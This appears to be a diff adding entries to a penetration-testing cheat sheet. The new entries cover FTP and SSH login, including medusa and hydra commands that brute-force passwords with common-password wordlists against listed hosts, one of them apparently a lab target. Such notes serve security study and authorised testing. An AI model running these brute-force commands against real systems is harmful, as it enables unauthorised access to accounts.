@@ -94,9 +94,15 @@ router
 >```
 #### FTP
 
+>[!code]- Brute force login
+>```powershell
+>medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
+>```
+
 >[!code]- Connect to FTP server
 >```bash
 >ftp $ip
+>ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost
 >```
 
 >[!code]- Download all files
@@ -486,6 +492,23 @@ router
 >Using **snmp-check**, enumerate the tree and obtain key information:
 >```bash
 >kali@kali:~$ snmp-check 192.168.221.42
+>```
+### SSH
+
+>[!code]- Login
+>```powershell
+>ssh sshuser@192.168.10.2
+>ssh sshyser@192.168.10.2 -p 2222
+>```
+
+>[!code]- Brute force login
+>###### Hydra
+>```powershell
+>hydra -l sshuser -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt ssh://94.237.57.115 -s 51236
+>```
+>###### Medusa
+>```powershell
+>medusa -h IP -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
 >```
 #### HTTP
 
